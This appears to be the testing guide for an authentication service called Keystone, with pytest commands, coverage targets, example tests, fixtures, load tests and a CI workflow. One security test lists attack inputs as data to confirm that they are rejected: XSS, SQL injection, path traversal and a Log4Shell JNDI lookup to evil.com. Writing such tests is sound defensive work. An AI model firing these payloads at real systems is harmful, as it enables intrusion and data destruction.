# 🧪 Testing Guide

This comprehensive testing guide covers all aspects of testing the Keystone Authentication System, from unit tests to security testing and performance validation.

## 📋 Testing Overview

Keystone uses a multi-layered testing strategy:

- **Unit Tests**: Test individual components in isolation
- **Integration Tests**: Test component interactions and database operations
- **Security Tests**: Test authentication, authorization, and security features
- **API Tests**: Test HTTP endpoints and request/response handling
- **Performance Tests**: Test system performance under load
- **End-to-End Tests**: Test complete user workflows

## 🏗️ Test Architecture

### Test Structure

```
tests/
├── conftest.py                 # Global test configuration and fixtures
├── test_runner.py             # Test runner utilities
├── unit/                      # Unit tests
│   ├── test_jwt.py           # JWT service tests
│   ├── test_password.py      # Password utilities tests
│   ├── test_exceptions.py    # Exception handling tests
│   └── test_security.py      # Security utilities tests
├── test_app/                 # Application tests
│   ├── test_models/          # Model tests
│   │   ├── test_user.py      # User model tests
│   │   ├── test_role.py      # Role model tests
│   │   ├── test_scope.py     # Scope model tests
│   │   ├── test_service_client.py
│   │   └── test_refresh_token.py
│   ├── test_core/            # Core module tests
│   │   ├── test_jwt.py       # JWT core tests
│   │   ├── test_password.py  # Password core tests
│   │   ├── test_security.py  # Security core tests
│   │   └── test_exceptions.py
│   ├── test_config/          # Configuration tests
│   │   ├── test_settings.py  # Settings tests
│   │   ├── test_database.py  # Database config tests
│   │   └── test_redis.py     # Redis config tests
│   └── test_api/             # API endpoint tests
│       ├── test_auth.py      # Authentication endpoints
│       ├── test_users.py     # User management endpoints
│       ├── test_admin.py     # Admin endpoints
│       └── test_clients.py   # Service client endpoints
├── integration/              # Integration tests
│   ├── test_database.py      # Database integration tests
│   ├── test_redis.py         # Redis integration tests
│   ├── test_auth_flows.py    # End-to-end auth flows
│   └── test_api_endpoints.py # API integration tests
├── security/                 # Security tests
│   ├── test_authentication.py # Authentication security
│   ├── test_authorization.py  # Authorization security
│   ├── test_token_security.py # Token security
│   ├── test_rate_limiting.py  # Rate limiting tests
│   └── test_input_validation.py # Input validation tests
├── performance/              # Performance tests
│   ├── test_load.py          # Load testing
│   ├── test_stress.py        # Stress testing
│   └── test_benchmarks.py    # Performance benchmarks
└── e2e/                      # End-to-end tests
    ├── test_user_journey.py   # Complete user workflows
    └── test_admin_journey.py  # Admin workflows
```

## 🚀 Running Tests

### Quick Test Commands

```bash
# Run all tests
pytest

# Run with coverage
pytest --cov=app --cov-report=html --cov-report=term

# Run specific test categories
pytest -m unit          # Unit tests only
pytest -m integration   # Integration tests only
pytest -m security      # Security tests only
pytest -m performance   # Performance tests only

# Run specific test files
pytest tests/unit/test_jwt.py
pytest tests/security/test_authentication.py

# Run tests in parallel
pytest -n auto

# Run with verbose output
pytest -v

# Run failed tests only
pytest --lf
```

### Test Configuration

```bash
# Set test environment
export ENVIRONMENT=testing

# Run with specific database
export DATABASE_URL=postgresql+asyncpg://test:test@localhost:5432/keystone_test

# Run with test Redis
export REDIS_URL=redis://localhost:6379/1

# Disable rate limiting for tests
export RATE_LIMIT_LOGIN=1000/minute
```

## 📊 Test Coverage Goals

### Coverage Targets

| Component | Target Coverage | Current Status |
|-----------|----------------|----------------|
| Models | 95% | ✅ Achieved |
| Core Services | 90% | ⚠️ In Progress |
| API Endpoints | 85% | ❌ Missing |
| Security Features | 95% | ❌ Missing |
| Configuration | 80% | ❌ Missing |
| **Overall** | **90%** | **❌ 30%** |

### Coverage Report

```bash
# Generate HTML coverage report
pytest --cov=app --cov-report=html
open htmlcov/index.html

# Generate terminal report
pytest --cov=app --cov-report=term-missing

# Set minimum coverage threshold
pytest --cov=app --cov-fail-under=80
```

## 🧪 Test Examples

### Unit Test Example

```python
# tests/unit/test_password.py
import pytest
from app.core.password import hash_password, verify_password, validate_password

class TestPasswordSecurity:
    """Test password security functions."""

    @pytest.mark.unit
    def test_password_hashing(self):
        """Test password hashing and verification."""
        password = "TestPassword123!"
        hashed = hash_password(password)
        
        # Hash should be different from original
        assert hashed != password
        assert len(hashed) > 50
        assert hashed.startswith("$argon2")
        
        # Verification should work
        assert verify_password(password, hashed) is True
        assert verify_password("wrong", hashed) is False

    @pytest.mark.unit
    def test_password_validation(self):
        """Test password policy validation."""
        # Valid password
        assert validate_password("ValidPassword123!") == []
        
        # Invalid passwords
        errors = validate_password("weak")
        assert len(errors) > 0
        assert any("length" in error.lower() for error in errors)
```

### Integration Test Example

```python
# tests/integration/test_auth_flows.py
import pytest
from httpx import AsyncClient

class TestAuthenticationFlows:
    """Test complete authentication workflows."""

    @pytest.mark.integration
    async def test_user_registration_and_login(self, async_client: AsyncClient):
        """Test user registration followed by login."""
        # Register user
        registration_data = {
            "username": "integrationtest",
            "email": "integration@example.com",
            "password": "IntegrationTest123!",
            "first_name": "Integration",
            "last_name": "Test"
        }
        
        response = await async_client.post(
            "/api/v1/users/register",
            json=registration_data
        )
        assert response.status_code == 201
        
        # Login with registered user
        login_data = {
            "username": "integrationtest",
            "password": "IntegrationTest123!"
        }
        
        response = await async_client.post(
            "/api/v1/auth/token",
            data=login_data
        )
        assert response.status_code == 200
        
        tokens = response.json()
        assert "access_token" in tokens
        assert "refresh_token" in tokens
        assert tokens["token_type"] == "Bearer"
```

### Security Test Example

```python
# tests/security/test_input_validation.py
import pytest
from httpx import AsyncClient

class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.security
    async def test_malicious_input_rejection(self, async_client: AsyncClient):
        """Test rejection of malicious inputs."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            response = await async_client.post(
                "/api/v1/users/register",
                json={
                    "username": malicious_input,
                    "email": "test@example.com",
                    "password": "TestPassword123!"
                }
            )
            
            # Should reject malicious input
            assert response.status_code in [400, 422]
```

## 🔧 Test Utilities

### Custom Test Fixtures

```python
# tests/conftest.py
import pytest
from app.models.user import User
from app.models.role import Role
from app.core.password import hash_password
from app.core.jwt import jwt_service

@pytest.fixture
async def test_user_with_roles(db_session, test_role, admin_role):
    """Create test user with multiple roles."""
    user = User(
        username="multiroleuser",
        email="multirole@example.com",
        password_hash=hash_password("MultiRole123!"),
        first_name="Multi",
        last_name="Role"
    )
    
    user.roles.extend([test_role, admin_role])
    db_session.add(user)
    await db_session.commit()
    await db_session.refresh(user)
    
    return user

@pytest.fixture
def auth_headers_with_scopes(test_user, scopes=None):
    """Create auth headers with specific scopes."""
    if scopes is None:
        scopes = ["read:profile", "write:profile"]
    
    token = jwt_service.create_access_token(
        subject=str(test_user.id),
        scopes=scopes,
        audience=["test-api"],
        username=test_user.username,
        email=test_user.email
    )
    
    return {"Authorization": f"Bearer {token}"}
```

### Test Data Factories

```python
# tests/factories.py
import factory
from app.models.user import User
from app.models.role import Role
from app.core.password import hash_password

class UserFactory(factory.Factory):
    """Factory for creating test users."""
    
    class Meta:
        model = User
    
    username = factory.Sequence(lambda n: f"user{n}")
    email = factory.LazyAttribute(lambda obj: f"{obj.username}@example.com")
    password_hash = factory.LazyFunction(lambda: hash_password("TestPassword123!"))
    first_name = factory.Faker("first_name")
    last_name = factory.Faker("last_name")
    is_active = True
    is_verified = True

class AdminUserFactory(UserFactory):
    """Factory for creating admin users."""
    
    username = factory.Sequence(lambda n: f"admin{n}")
    is_superuser = True

class RoleFactory(factory.Factory):
    """Factory for creating test roles."""
    
    class Meta:
        model = Role
    
    name = factory.Sequence(lambda n: f"role{n}")
    description = factory.LazyAttribute(lambda obj: f"Description for {obj.name}")
```

## 📈 Performance Testing

### Load Testing with Locust

```python
# tests/performance/locustfile.py
from locust import HttpUser, task, between

class AuthenticationUser(HttpUser):
    """Simulate user authentication load."""
    
    wait_time = between(1, 3)
    
    def on_start(self):
        """Setup for each user."""
        # Register a unique user
        self.username = f"loadtest_{self.environment.runner.user_count}"
        self.password = "LoadTest123!"
        
        response = self.client.post("/api/v1/users/register", json={
            "username": self.username,
            "email": f"{self.username}@example.com",
            "password": self.password
        })
        
        if response.status_code == 201:
            self.user_registered = True
        else:
            self.user_registered = False
    
    @task(3)
    def login(self):
        """Test login performance."""
        if not self.user_registered:
            return
        
        response = self.client.post("/api/v1/auth/token", data={
            "username": self.username,
            "password": self.password
        })
        
        if response.status_code == 200:
            tokens = response.json()
            self.access_token = tokens["access_token"]
    
    @task(5)
    def access_profile(self):
        """Test authenticated endpoint access."""
        if not hasattr(self, 'access_token'):
            return
        
        headers = {"Authorization": f"Bearer {self.access_token}"}
        self.client.get("/api/v1/users/profile", headers=headers)
    
    @task(1)
    def refresh_token(self):
        """Test token refresh performance."""
        if not hasattr(self, 'refresh_token'):
            return
        
        self.client.post("/api/v1/auth/refresh", json={
            "refresh_token": self.refresh_token
        })

# Run with: locust -f tests/performance/locustfile.py --host=http://localhost:8000
```

### Benchmark Tests

```python
# tests/performance/test_benchmarks.py
import pytest
import time
import asyncio
from statistics import mean, median

class TestPerformanceBenchmarks:
    """Performance benchmark tests."""

    @pytest.mark.performance
    async def test_jwt_token_generation_benchmark(self):
        """Benchmark JWT token generation performance."""
        from app.core.jwt import jwt_service
        
        iterations = 1000
        times = []
        
        for _ in range(iterations):
            start_time = time.perf_counter()
            
            token = jwt_service.create_access_token(
                subject="benchmark-user",
                scopes=["read:profile"],
                audience=["api-server"]
            )
            
            end_time = time.perf_counter()
            times.append(end_time - start_time)
        
        # Performance assertions
        avg_time = mean(times)
        median_time = median(times)
        max_time = max(times)
        
        print(f"JWT Generation - Avg: {avg_time:.4f}s, Median: {median_time:.4f}s, Max: {max_time:.4f}s")
        
        assert avg_time < 0.001  # Less than 1ms average
        assert median_time < 0.001  # Less than 1ms median
        assert max_time < 0.01  # Less than 10ms maximum

    @pytest.mark.performance
    async def test_password_hashing_benchmark(self):
        """Benchmark password hashing performance."""
        from app.core.password import hash_password
        
        iterations = 100  # Fewer iterations as hashing is intentionally slow
        times = []
        
        for i in range(iterations):
            password = f"BenchmarkPassword{i}123!"
            
            start_time = time.perf_counter()
            hash_password(password)
            end_time = time.perf_counter()
            
            times.append(end_time - start_time)
        
        avg_time = mean(times)
        print(f"Password Hashing - Avg: {avg_time:.4f}s")
        
        # Password hashing should be slow for security
        assert 0.1 < avg_time < 2.0  # Between 100ms and 2s
```

## 🔍 Test Debugging

### Debugging Failed Tests

```bash
# Run with debugger
pytest --pdb

# Run with detailed output
pytest -vvv

# Run specific test with debugging
pytest tests/unit/test_jwt.py::TestJWTService::test_create_access_token -vvv --pdb

# Show local variables on failure
pytest --tb=long

# Show full diff on assertion failures
pytest --tb=short -vv
```

### Test Logging

```python
# Enable logging in tests
import logging
logging.basicConfig(level=logging.DEBUG)

# Or use pytest logging
pytest --log-cli-level=DEBUG
```

## 📋 Testing Checklist

### Pre-Commit Testing

- [ ] All unit tests pass
- [ ] Code coverage above 80%
- [ ] No security test failures
- [ ] Linting passes (black, isort, flake8)
- [ ] Type checking passes (mypy)

### Pre-Release Testing

- [ ] All test categories pass
- [ ] Integration tests with real databases
- [ ] Security penetration tests
- [ ] Performance benchmarks meet targets
- [ ] Load testing completed
- [ ] End-to-end user journeys tested

### Continuous Integration

```yaml
# .github/workflows/test.yml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        pip install poetry
        poetry install --with dev
    
    - name: Run tests
      run: |
        poetry run pytest --cov=app --cov-report=xml --cov-fail-under=80
      env:
        DATABASE_URL: postgresql+asyncpg://postgres:postgres@localhost:5432/postgres
        REDIS_URL: redis://localhost:6379/0
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
```

## 🚨 Test Maintenance

### Keeping Tests Updated

1. **Regular Review**: Review and update tests monthly
2. **Dependency Updates**: Update test dependencies regularly
3. **Test Data Cleanup**: Clean up test data and fixtures
4. **Performance Monitoring**: Monitor test execution times
5. **Coverage Monitoring**: Track coverage trends

### Test Best Practices

1. **Test Naming**: Use descriptive test names
2. **Test Independence**: Each test should be independent
3. **Test Data**: Use factories and fixtures for test data
4. **Assertions**: Use specific assertions with clear messages
5. **Documentation**: Document complex test scenarios

## 📚 Testing Resources

### Tools and Libraries

- **pytest**: Primary testing framework
- **pytest-asyncio**: Async test support
- **pytest-cov**: Coverage reporting
- **testcontainers**: Integration testing with real services
- **factory-boy**: Test data factories
- **locust**: Load testing
- **bandit**: Security testing

### Further Reading

- [pytest Documentation](https://docs.pytest.org/)
- [FastAPI Testing](https://fastapi.tiangolo.com/tutorial/testing/)
- [SQLAlchemy Testing](https://docs.sqlalchemy.org/en/14/orm/session_transaction.html#joining-a-session-into-an-external-transaction-such-as-for-test-suites)
- [Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

**Test with confidence! 🧪 Comprehensive testing ensures reliable, secure authentication systems.**